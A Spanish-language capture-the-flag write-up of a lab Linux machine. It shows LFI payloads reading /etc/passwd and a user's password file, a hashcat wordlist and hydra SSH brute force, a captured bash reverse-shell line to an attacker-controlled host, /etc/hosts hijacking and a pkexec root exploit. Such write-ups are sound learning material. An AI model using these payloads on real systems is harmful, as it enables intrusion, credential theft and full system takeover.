#Linux #Easy 
## Nmap 
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[webatlanta.png | 900]]

Directamente en la web vemos esto: ``http://10.10.228.16/index.php?page=home.html``
## Local File Inclusion

[Example](https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb)
Podemos ver el contenido del archivo ``.php`` de la pagina.
```bash
❯ curl --path-as-is "http://10.10.139.248/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=index.php"
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

aprovechamos para ver el ``/etc/passwd``
```python
❯ curl --path-as-is "http://10.10.139.248/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash

```

Miramos el ``.bash_history`` para ver el historial de comandos ejecutados.
```bash
❯ curl --path-as-is "http://10.10.139.248/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=/home/blue/.bash_history"
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

Veo algunos comandos, esta creando una listas de passwords con el contenido de el archivo ``.reminder`` y lo guarda en un ``passlist.txt``

El archivo ``.reminder`` contiene esto:
```bash
❯ curl --path-as-is "http://10.10.139.248/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=/home/blue/.reminder"
sup3r_p@s$w0rd!
```

Voy a crear una lista de passwords al igual que se hizo en la maquina:
```bash
❯ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
❯ ls
passlist.txt
```

Fuerza Bruta con ``hydra``
```bash
❯ hydra -l blue -P passlist.txt ssh://10.10.139.248
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-24 15:59:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.139.248:22/
[22][ssh] host: 10.10.139.248   login: blue   password: sup3r_p@s$w0!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-24 16:00:12
```

Al ejecutar pspy, podemos ver este proceso ejecutándose: 
```bash
2023/10/24 20:08:55 CMD: UID=1001  PID=14911  | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
```

Se manda una revShell a el dominio ``redrules.thm``, vamos a ver a que apunta esto en el ``etc/hosts``:
```bash
blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
```

El dominio no apunta a ningún lado, pero podemos modificar el archivo ``etc/hosts`` porque tenemos permisos:
```bash
blue@red:~$ ls -la /etc/ | grep hosts
-rw-r--rw-   1 root adm         242 Oct 24 20:12 hosts
```

```bash
echo "10.8.189.249 redrules.thm" >> /etc/hosts
```

### Escalada de Priv

Buscamos Binarios con permisos ``SUID``
```bash
find / -type f -perm -04000 -ls 2>/dev/null

418507     32 -rwsr-xr-x   1 root     root        31032 Aug 14  2022 /home/red/.git/pkexec
```

[Exploit para elevar priv](https://github.com/Almorabea/pkexec-exploit/tree/main)

Modificamos la linea:
```bash
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
```

Ponemos la ruta de pkexec. 

Ya somos ROOT

